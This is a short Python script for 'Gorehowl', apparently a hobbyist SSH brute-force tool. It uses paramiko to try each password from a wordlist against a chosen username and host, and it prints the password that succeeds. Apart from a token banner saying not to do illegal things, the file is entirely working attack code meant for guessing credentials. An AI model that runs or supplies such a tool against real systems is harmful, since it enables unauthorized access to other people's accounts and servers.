# SSH BRUTE FORCE

import argparse
from paramiko import SSHClient
import paramiko
import time
import argparse
import socket

# BANNERS

print(" -- G0reH0wl3 -- ")
print("Dont do illegal activities...")
print("Gorehowl SSH bruteforcer")
print("MADE BY the3x0rcist")
print("-" * 50)

# Creating Arguments with argparse

parser = argparse.ArgumentParser()

parser.add_argument('-w', '--wordlist', required=True)
parser.add_argument('-u', '--username', required=True)
parser.add_argument('-a', '--hostname', required=True)

args = parser.parse_args()

client = SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


date = time.strftime("%H:%M:%S - %Y/%m/%d\n")

print(f"Start Attacking [{args.hostname}] - {date}")


def attack():
        try:
                with open(args.wordlist, 'r') as f:

                                for pw in f:
                                        pw = pw.strip()
                                        try:
                                                client.connect(hostname=args.hostname, username=args.username, password=pw)
                                                print(f"[*] Correct password: {pw}")
                                                print(f"Connected successfully to {args.username}@{args.hostname} with [{pw}]")
                                                client.close()
                                                break

                                        except paramiko.AuthenticationException:
                                                print(f"[*] Wrong password: {pw}")
                                print("Finished at", date)
        except socket.gaierror:
                print(50 * "-")
                print(f"Can't connect to [{args.hostname}]")

if __name__ == "__main__":
        attack()
